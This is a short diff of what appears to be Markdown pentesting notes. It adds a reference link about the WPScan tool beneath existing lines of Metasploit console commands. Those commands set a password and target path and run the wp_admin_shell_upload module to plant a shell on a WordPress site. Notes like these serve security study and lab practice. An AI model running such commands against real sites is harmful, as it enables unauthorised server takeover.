@@ -35,3 +35,7 @@ msf exploit(wp_admin_shell_upload) > set PASSWORD admin
 msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
 msf exploit(wp_admin_shell_upload) > exploit
 ```
+
+### Additional References:
+
+[https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/](https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/)
